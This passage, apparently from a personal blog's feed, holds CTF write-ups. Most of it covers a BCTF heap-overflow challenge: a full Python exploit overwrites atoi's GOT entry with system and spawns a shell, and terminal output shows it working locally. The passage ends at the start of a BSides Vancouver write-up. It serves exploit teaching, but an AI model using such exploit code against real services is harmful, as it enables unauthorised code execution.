</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;-&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xe</span><span class="p">)</span>
</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x4f</span><span class="p">)</span> 
</span><span class='line'>  
</span><span class='line'>  <span class="c"># overflow</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;-&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xe</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># 0x8049b64 is a pointer to 0x0804932e</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x4f</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x8049b64</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># generate store menu &amp; overflow; 2nd item now points to 0x8049b64: 0x0804932e -&gt; sprintf function, used to overwrite ptr to money</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;c&#39;</span><span class="p">)</span> 
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;d&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;b&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;buy?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># get wholesale price, trigger function 0x0804932e</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;b&#39;</span><span class="p">)</span> 
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;buy?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># this value is used as an argument for 0x0804932e, conveniently translated for us by atoi!</span>
</span><span class='line'>  <span class="c"># it is 0x804b280-51, so that the output of sprintf is aligned and will overwrite the money pointer with the address of atoi@got</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;134525517&#39;</span><span class="p">)</span> 
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># ok, now have control over ptr to money!</span>
</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>This allowed me to write to <code>atoi@got</code>! Or so I thought. The problem is that <code>atoi@got</code> contains <code>0xf74e2880</code>, which is atoi in libc. This number is interpreted by the program as a negative amount of money. When trying to modify the value at <code>atoi@got</code>, the value it contains is passed via this block of code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'> <span class="mi">8048</span><span class="n">f6b</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">ds</span><span class="p">:</span><span class="mh">0x804b280</span> <span class="p">;</span> <span class="n">grab</span> <span class="n">location</span> <span class="n">of</span> <span class="n">money</span> <span class="n">DWORD</span> <span class="kn">from</span> <span class="nn">money</span> <span class="nn">pointer</span> <span class="p">(</span><span class="n">it</span> <span class="n">will</span> <span class="n">point</span> <span class="n">to</span> <span class="n">atoi</span><span class="nd">@got</span><span class="p">)</span>
</span><span class='line'> <span class="mi">8048</span><span class="n">f71</span><span class="p">:</span> <span class="n">imul</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esi</span><span class="o">+</span><span class="mh">0x74</span><span class="p">]</span>   <span class="p">;</span> <span class="n">eax</span> <span class="n">contains</span> <span class="n">amount</span> <span class="n">of</span> <span class="n">item</span> <span class="n">to</span> <span class="n">buy</span><span class="p">,</span> <span class="n">multiply</span> <span class="n">it</span> <span class="n">by</span> <span class="n">price</span> <span class="n">of</span> <span class="n">item</span>
</span><span class='line'> <span class="mi">8048</span><span class="n">f75</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">edx</span><span class="p">]</span>        <span class="p">;</span> <span class="n">grab</span> <span class="n">money</span> <span class="n">amount</span>
</span><span class='line'> <span class="mi">8048</span><span class="n">f77</span><span class="p">:</span> <span class="n">sub</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">eax</span>                    <span class="p">;</span> <span class="n">subtract</span> <span class="n">cost</span> <span class="kn">from</span> <span class="nn">amount</span> <span class="nn">of</span> <span class="nn">money</span>
</span><span class='line'> <span class="mi">8048</span><span class="n">f79</span><span class="p">:</span> <span class="n">js</span>     <span class="mi">8049008</span> <span class="o">&lt;</span><span class="nb">exit</span><span class="nd">@plt</span><span class="o">+</span><span class="mh">0x838</span><span class="o">&gt;</span>   <span class="p">;</span> <span class="n">jump</span><span class="o">-</span><span class="k">if</span><span class="o">-</span><span class="n">sign</span><span class="p">:</span> <span class="k">if</span> <span class="n">the</span> <span class="n">amount</span> <span class="n">of</span> <span class="n">leftover</span> <span class="n">money</span> <span class="ow">is</span> <span class="n">negative</span><span class="p">,</span> <span class="n">abort</span> <span class="n">the</span> <span class="n">transaction</span><span class="err">!</span>
</span></code></pre></td></tr></table></div></figure>


<p>Since I needed to modify <code>atoi</code> (0xf74e2880) to <code>system</code> (0xf74f0c30), this <code>sub ecx,eax / js</code> block above would <em>never</em> let me modify the pointer in the global offset table to <code>system</code>. Looking back, the solution is easy, but I could not figure it out late at night.</p>

<h2>Take one step back</h2>

<p>After the CTF had ended, it dawned on me: I did not have to modify the got pointer of <code>atoi</code> completely, I could modify <em>part</em> of it! After all, if I move one byte back, the value I would be modifying would be <code>0x4f0c30xx</code>; this is still a positive number! Of course, it is possible that <code>atoi</code> is located at an address such as <code>0xf7dff880</code>; in this case, it still would not work.</p>

<p>I updated the poc once more, to make the money object point to <code>atoi@got-1</code>. I needed to add 0x50dc3000-0x4ff88000 = 14921728 to atoi so that it points to system (at least, locally, on my box). This is done by buying item 2. It&rsquo;s price is set to <code>0x7fffffff</code>. Multiplying that by 14921728 gives an integer overflow to 0xff1c5000. The latter value will be subtracted from the value at atoi-1, conveniently updating the right portion of atoi!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendbin</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">6666</span><span class="p">))</span>
</span><span class='line'>  <span class="c">#s.connect((&#39;146.148.60.107&#39;, 6666))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># pause to allow gdb to attach</span>
</span><span class='line'>  <span class="nb">raw_input</span><span class="p">()</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># register store</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>     
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;store?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&quot;S&quot;</span><span class="o">*</span><span class="mi">63</span><span class="p">)</span> <span class="c"># store name; maximum allowed, need it to overflow a buffer later!</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># the program *needs* to have an item to sell before it can generate a store menu</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>     <span class="c"># sell a phone</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;-&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xe</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x4f</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># generate store menu. this will be 0xb20 bytes large, on the heap. </span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;c&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># second item</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>     <span class="c"># sell a phone</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xf</span><span class="p">)</span> <span class="c"># this will make the price of this item 0x7fffffff, ready to be abused later</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804b038</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x4f</span><span class="o">-</span><span class="mi">5</span><span class="p">))</span> <span class="c"># 0x804b038 = atoi@got </span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># allocate the rest of the items</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">13</span><span class="p">):</span>
</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>     <span class="c"># sell a phone</span>
</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;-&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xe</span><span class="p">)</span>
</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x4f</span><span class="p">)</span> 
</span><span class='line'>  
</span><span class='line'>  <span class="c"># overflow</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;-&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xe</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x4f</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x8049b64</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;c&#39;</span><span class="p">)</span> <span class="c"># generate store menu &amp; overflow into 2nd item</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;d&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;b&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;buy?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;b&#39;</span><span class="p">)</span> <span class="c"># get wholesale price</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;buy?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;134525517&#39;</span><span class="p">)</span> <span class="c"># is 0x804b280-51, so that the sprintf is aligned and will overwrite the money pointer with atoi@got or snprintf@got</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;buy?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;14921728&#39;</span><span class="p">)</span>  <span class="c"># this is the offset of atoi to system on *my* box, 58288*256 (the *256 is to compensate for the crooked ptr)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;buy?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;/bin/sh;&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># ok, should have a shell by now!</span>
</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>The binary is running locally via <code>socat</code>. Running the python script lands a shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/bctf/zhonguancun<span class="nv">$ </span>python ./zhong.py
</span><span class='line'>
</span><span class='line'> <span class="o">&lt;&lt;&lt;</span> Store Name: SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS &gt;&gt;&gt;
</span><span class='line'>...snip...
</span><span class='line'>15<span class="o">)</span> Blackberry OS Phone AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA price: -2147483648 CNY description: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
</span><span class='line'>16<span class="o">)</span> Blackberry OS Phone AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA price: -2147483648 CNY description: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBd�
</span><span class='line'>Your total money: <span class="m">100000</span> CNY.
</span><span class='line'>What <span class="k">do</span> you want to buy?
</span><span class='line'> whoami
</span><span class='line'>bas
</span><span class='line'>uname -a
</span><span class='line'>Linux tritonal 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.65-1+deb7u2 x86_64 GNU/Linux</span>
</span></code></pre></td></tr></table></div></figure>


<p>Unfortunately, a day too late for the CTF.</p>

<h2>Conclusion</h2>

<p>I had found nearly all the puzzle pieces, yet missed the final small piece. For the next CTF, I will Try Harder!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[BSides Vancouver CTF - WWW]]></title>
    <link href="http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-www/"/>
    <updated>2015-03-18T20:36:56+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-www</id>
    <content type="html"><![CDATA[<p>After solving <code>sushi</code>, there were plenty of pwnables left to choose from. Next up was <code>www</code>!</p>

<!-- more -->


<p><code>www</code> was a 200 point challenge and consisted of a 32-bit Linux binary. After dealing with <code>sushi</code>, I decided to inspect the binary in <code>gdb-peda</code> right away:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>checksec
</span><span class='line'>CANARY    : disabled
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : disabled
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : disabled
</span></code></pre></td></tr></table></div></figure>


<p>Again, no protections in place. Running the binary reveals what it is trying to do:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
